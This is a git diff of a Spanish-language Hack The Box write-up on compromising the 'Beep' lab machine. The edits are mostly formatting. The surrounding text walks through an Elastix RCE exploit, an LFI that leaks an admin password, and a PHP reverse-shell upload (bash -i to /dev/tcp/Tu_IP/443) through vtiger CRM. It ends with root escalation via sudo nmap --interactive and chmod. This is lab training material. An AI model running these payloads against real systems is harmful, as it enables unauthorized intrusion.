@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Beep - Hack The Box
-excerpt: "Esta máquina es una máquina relativamente fácil, pues hay bastantes maneras de poder vulnerarla. Lo que haremos, será usar un Exploit que nos conecte de manera remota a la máquina, será configurado y modificado para que sea aceptado, pues la página web que esta activa en el puerto 80, tiene ya expirado su certificado SSL. Una vez dentro, usaremos los permisos que tenemos para convertirnos en Root usando la herramienta nmap tal y como lo menciona el Exploit usado."
+excerpt: "Esta máquina es relativamente fácil, pues hay bastantes maneras de poder vulnerarla. Lo que haremos, será usar un Exploit que nos conecte de manera remota a la máquina, será configurado y modificado para que sea aceptado, pues la página web que esta activa en el puerto 443, tiene ya expirado su certificado SSL. Una vez dentro, usaremos los permisos que tenemos para convertirnos en Root usando la herramienta nmap tal y como lo menciona el Exploit usado."
 date: 2023-02-15
 classes: wide
 header:
@@ -16,28 +16,33 @@ tags:
   - Elastix
   - vtiger CRM
   - Remote Code Execution (RCE) 
-  - RCE - CVE-2012-4869
-  - Local File Inclusion
-  - LFI - Elastix 2.2.0 - 'graph.php'
+  - CVE-2012-4869 (RCE)
+  - Local File Inclusion (LFI)
+  - Elastix 2.2.0 - 'graph.php' (LFI)
   - Information Leakage
-  - Remote Code Execution (Authenticated)
-  - RCE - CVE-2009-3250
-  - Abusing Sudoers Privileges
+  - Remote Code Execution - Authenticated (RCE - Authenticated)
+  - CVE-2009-3250 (RCE - Authenticated)
+  - Privesc - Abusing Sudoers Privileges
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-beep/beep_logo.png)
 
-Esta máquina es una máquina relativamente fácil, pues hay bastantes maneras de poder vulnerarla. Lo que haremos, será usar un Exploit que nos conecte de manera remota a la máquina, será configurado y modificado para que sea aceptado, pues la página web que esta activa en el puerto 80, tiene ya expirado su **certificado SSL**. Una vez dentro, usaremos los permisos que tenemos para convertirnos en Root usando la **herramienta nmap** tal y como lo menciona el Exploit usado.
+Esta máquina es relativamente fácil, pues hay bastantes maneras de poder vulnerarla. Lo que haremos, será usar un Exploit que nos conecte de manera remota a la máquina, será configurado y modificado para que sea aceptado, pues la página web que esta activa en el puerto 443, tiene ya expirado su **certificado SSL**. Una vez dentro, usaremos los permisos que tenemos para convertirnos en Root usando la **herramienta nmap** tal y como lo menciona el Exploit usado.
 
 Herramientas utilizadas:
+* *ping*
 * *nmap*
+* *wappalizer*
 * *whatweb*
 * *wfuzz*
 * *gobuster*
+* *searchsploit*
 * *svwar*
 * *nc*
 * *burpsuite*
+* *sudo*
 * *chmod*
+* *bash*
 
 
 <br>
@@ -54,7 +59,7 @@ Herramientas utilizadas:
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#Web">Analizando Página Web</a></li>
+				<li><a href="#Web">Analizando Servicio HTTPS</a></li>
 				<li><a href="#Fuzz">Fuzzing</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
@@ -69,6 +74,9 @@ Herramientas utilizadas:
                                 </ul>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
+			<ul>
+				<li><a href="#Privesc">Abusando de los Privilegios del Usuario Asterisk, Usando nmap y chmod para Escalar Privilegios</a></li>
+			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
 </div>
@@ -78,10 +86,7 @@ Herramientas utilizadas:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -297,19 +302,16 @@ Vemos muchos servicios, protocolos y programas que en mi caso son desconocidas o
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
 
-<h2 id="Web">Analizando Página Web</h2>
+<h2 id="Web">Analizando Servicio HTTPS</h2>
 
-**IMPORTANTE**, tuve problemas para entrar pues salia el error **SSL_ERROR_UNSUPPORTED_VERSION**, el sig. link explica como resolverlo, echale un ojo:
+**IMPORTANTE**, tuve problemas para entrar pues salía el error **SSL_ERROR_UNSUPPORTED_VERSION**, el siguiente link explica como resolverlo, echale un ojo: <a href="https://stackoverflow.com/questions/63111167/ssl-error-unsupported-version-when-attempting-to-debug-with-iis-express" target="_blank">SSL_ERROR_UNSUPPORTED_VERSION when attempting to debug with IIS Express</a>
 
-* https://stackoverflow.com/questions/63111167/ssl-error-unsupported-version-when-attempting-to-debug-with-iis-express
+----------
 
 Muy bien, ya estamos dentro:
 
@@ -327,9 +329,9 @@ whatweb https://10.10.10.7
 https://10.10.10.7 [200 OK] Apache[2.2.3], Cookies[elastixSession], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.2.3 (CentOS)], IP[10.10.10.7], PHP[5.1.6], PasswordField[input_pass], Script[text/javascript], Title[Elastix - Login page], X-Powered-By[PHP/5.1.6]
 ```
 
-Usan PHP, entonces podemos hacer un **Fuzzing** para ver que otras subpáginas hay, pero antes de hacerlo, probemos si sirven las credenciales por defecto que tiene el servicio **Elastix**, las credenciales son:
-* eLaStIx.
-* 2oo7
+Usan **PHP**, entonces podemos hacer un **Fuzzing** para ver que otras subpáginas hay, pero antes de hacerlo, probemos si sirven las credenciales por defecto que tiene el servicio **Elastix**, las credenciales son:
+* *eLaStIx*
+* *2oo7*
 
 No sirvieron, bueno hagamos el **Fuzzing**.
 
@@ -353,19 +355,7 @@ ID           Response   Lines    Word       Chars       Payload
 000000013:   200        34 L     111 W      1785 Ch     "#"                                                                                                                                                                       
 000000016:   200        165 L    1549 W     29898 Ch    "images"                                                                                                                                                                  
 000000083:   200        176 L    1665 W     31006 Ch    "icons"                                                                                                                                                                   
-000000001:   200        34 L     111 W      1785 Ch     "# directory-list-2.3-medium.txt"                                                                                                                                         
-000000008:   200        34 L     111 W      1785 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                                                                                                              
-000000010:   200        34 L     111 W      1785 Ch     "#"                                                                                                                                                                       
 000000014:   200        34 L     111 W      1785 Ch     "https://10.10.10.7//"                                                                                                                                                    
-000000012:   200        34 L     111 W      1785 Ch     "# on atleast 2 different hosts"                                                                                                                                          
-000000004:   200        34 L     111 W      1785 Ch     "#"                                                                                                                                                                       
-000000002:   200        34 L     111 W      1785 Ch     "#"                                                                                                                                                                       
-000000007:   200        34 L     111 W      1785 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                                                                         
-000000009:   200        34 L     111 W      1785 Ch     "# Suite 300, San Francisco, California, 94105, USA."                                                                                                                     
-000000005:   200        34 L     111 W      1785 Ch     "# This work is licensed under the Creative Commons"                                                                                                                      
-000000003:   200        34 L     111 W      1785 Ch     "# Copyright 2007 James Fisher"                                                                                                                                           
-000000006:   200        34 L     111 W      1785 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                                                                           
-000000011:   200        34 L     111 W      1785 Ch     "# Priority ordered case sensative list, where entries were found"                                                                                                        
 000000127:   200        26 L     189 W      3172 Ch     "themes"                                                                                                                                                                  
 000000145:   200        78 L     761 W      13132 Ch    "modules"                                                                                                                                                                 
 000000269:   200        16 L     73 W       1276 Ch     "static"                                                                                                                                                                  
@@ -386,7 +376,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 <br>
 
-Vamos a ver que tal se ve  con la herrrammienta Goobuster:
+Vamos a ver que tal se ve  con la herrrammienta **Gobuster**:
 ```bash
 gobuster dir -u https://10.10.10.7/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20 -k
 ===============================================================
@@ -439,7 +429,6 @@ Nos piden credenciales que no tenemos de momento y si cancelamos, nos manda un m
 <img src="/assets/images/htb-writeup-beep/Captura4.png">
 </p>
 
-
 Como de momento, no tenemos ninguna credencial para los logins que hemos encontrado, vamos a buscar un Exploit para el **servicio Elastix**.
 
 
@@ -447,10 +436,7 @@ Como de momento, no tenemos ninguna credencial para los logins que hemos encontr
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -497,7 +483,7 @@ lport=443
 Cambia esos datos y ejecuta el script con **Python2** y...nada, no me conecto a nada y no salió nada en la página. Supongo que es por el problema que tuve antes para poder entrar a la página, pues el **certificado SSL** parece ya no servir, quizá si lo modificamos puede que apruebe el Exploit y sirva, vamos a investigar un poco como podemos modificarlo.
 
 Durante la búsqueda, encontré un **GitHub** que justamente cambia el Exploit para que este opere bien:
-* https://github.com/infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution
+* <a href="https://github.com/infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution" target="_blank">Repositorio de infosecjunky: FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution</a>
 
 Para modificar el Exploit, se debe buscar una extensión que sirva con el **servicio FreePBX** que está relacionado con el **servicio Elastix** de esta máquina, pero ¿qué es **FreePBX**?
 
@@ -530,7 +516,7 @@ WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause 
 +-----------+----------------+
 ```
 Aquí más información sobre la **herramienta sipvicious**:
-* https://byte-mind.net/sipvicious-utilidad-de-auditoria-para-sistemas-voip/
+* <a href="https://byte-mind.net/sipvicious-utilidad-de-auditoria-para-sistemas-voip/" target="_blank">Sipvicious – Utilidad de auditoría para sistemas VoIP</a>
 
 Claro que en este caso ya no es necesario, pues ya hay una extensión que sirve dentro del Exploit modificado en el **GitHub**, lo único que tenemos que hacer es copiar los cambios, ósea, la extension, las 3 líneas de código abajo de la extensión y agregar el **context** al **urlopen**.
 
@@ -549,12 +535,13 @@ python2 Exploit_Elastix1.py
 ```bash
 nc -nvlp 443
 listening on [any] 443 ...
-connect to [10.10.14.12] from (UNKNOWN) [10.10.10.7] 49122
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.7] 49122
 whoami
 asterisk
 id
 uid=100(asterisk) gid=101(asterisk)
 ```
+
 Con esto, quiero pensar que la versión que es vulnerable es la **Elastix 2.2.0**, entonces, vamos a probar el Exploit que hace un **LFI**.
 
 <h2 id="PruebaExp2">Probando Exploit: Elastix 2.2.0 - 'graph.php' Local File Inclusion</h2>
@@ -581,6 +568,8 @@ Pero, ¿qué es un **LFI**?
 |:-----------:|
 | *Las vulnerabilidades LFI (Local File Inclusion o inclusión de archivos locales) son vulnerabilidades que permiten leer cualquier archivo que se encuentre dentro del mismo servidor, incluso si el archivo se encuentra fuera del directorio web donde está alojada la página.* |
 
+<br>
+
 Veamos el resultado de aplicarlo en la página web:
 
 <p align="center">
@@ -600,8 +589,8 @@ Observa que ahí estan usuarios y contraseñas, vamos a probar algunos de estos 
 </p>
 
 Las credenciales son:
-* Usuario: admin
-* Contraseña: jEhdIekWmdjE
+* *Usuario: admin*
+* *Contraseña: jEhdIekWmdjE*
 
 Si presionamos el botón de admiración, podemos ver mucha información de los servicios operando en el sistema:
 
@@ -639,13 +628,13 @@ Si funcionan, veamos de que va este servicio y busquemos si hay una forma de vul
 
 Investigando un poco, hay una forma subir un archivo malicioso que nos de una **Reverse Shell**:
 
-* https://packetstormsecurity.com/files/89823/vtiger-CRM-5.2.0-Shell-Upload.html
-* https://www.exploit-db.com/exploits/9450
+* <a href="https://packetstormsecurity.com/files/89823/vtiger-CRM-5.2.0-Shell-Upload.html" target="_blank">vtiger CRM 5.2.0 Shell Upload</a>
+* <a href="https://www.exploit-db.com/exploits/9450" target="_blank">vTiger CRM 5.0.4 - Remote Code Execution / Cross-Site Request Forgery / Local File Inclusion / Cross-Site Scripting</a>
 
 Aunque esto es para una versión superior (**vtiger CRM 5.2.0**) y también anterior (**vtiger CRM 5.0.4**), vamos a probar si funciona, utilizando ambos como guia. Hagamoslo por pasos:
 
 * Creamos un archivo malicioso en PHP que contenga un Payload de **Reverse Shell**, llamalo **cmd.php** o como quieras:
-```bash
+```php
 <?php
         system("bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1'");
 ?>
@@ -698,7 +687,7 @@ nc -nlvp 443
 <img src="/assets/images/htb-writeup-beep/Captura16.png">
 </p>
 
-
+* Resultado:
 ```bash
 nc -nvlp 443
 listening on [any] 443 ...
@@ -711,23 +700,21 @@ Y listo, volvimos a ganar acceso.
 
 **NOTA**:
 
-Existe otra forma de poder ganar acceso a la máquina, esto a traves del puerto 10000, ya sea apicando un ataque Shellshock o buscando una manera de subir un archivo malicioso para obtener una shell, puedes intentar hacer esto.
+Existe otra forma de poder ganar acceso a la máquina, esto a traves del **puerto 10000**, ya sea apicando un **ataque Shellshock** o buscando una manera de subir un archivo malicioso para obtener una shell, puedes intentar hacer esto.
 
 
 <br>
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
 </div>
 <br>
 
 
-Bueno, el mismo Exploit nos indica que hacer y es activar la **herramienta nmap** con **SUDO** de forma interactiva, para poder usar **nmap** desde la consola y no como comando, solamente escribimos **!sh** y podremos escalar privilegios para ser **Root**:
+<h2 id="Privesc">Abusando de los Privilegios del Usuario Asterisk, Usando nmap y chmod para Escalar Privilegios</h2>
 
+Bueno, el mismo Exploit nos indica que hacer y es activar la **herramienta nmap** con **SUDO** de forma interactiva, para poder usar **nmap** desde la consola y no como comando, solamente escribimos **!sh** y podremos escalar privilegios para ser **Root**:
 ```bash
 sudo nmap --interactive
 Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
@@ -769,11 +756,11 @@ User asterisk may run the following commands on this host:
 Tenemos varios permisos como Root y la mayoria son criticos. Existe una página muy útil que nos ayudara en este caso, para ver de qué otra forma podemos escalar privilegios para convertirnos en **Root**. 
 
 Esta página es **GTFOBins**: 
-* https://gtfobins.github.io/
+* <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a>
 
 Entonces veamos de que formas podemos escalar para ser **Root**, ojito que incluso ahí se ve una forma de usar la **herramienta nmap**, que fue el que uso el Exploit para convertirnos en Root, así que ¡¡PROBEMOS OTROS!!
 
-* Probando CHMOD:
+* Probando con **chmod**:
 ```
 ls -l /bin/bash
 -rwxr-xr-x 1 root root 729292 Jan 22  2009 /bin/bash
@@ -792,11 +779,9 @@ Por lo que leí en **GTFOBins**, se puede escalar usando chown, yum y service. �
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
+
 
 * https://stackoverflow.com/questions/63111167/ssl-error-unsupported-version-when-attempting-to-debug-with-iis-express
 * https://www.exploit-db.com/exploits/18650
@@ -819,3 +804,48 @@ Por lo que leí en **GTFOBins**, se puede escalar usando chown, yum y service. �
 
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
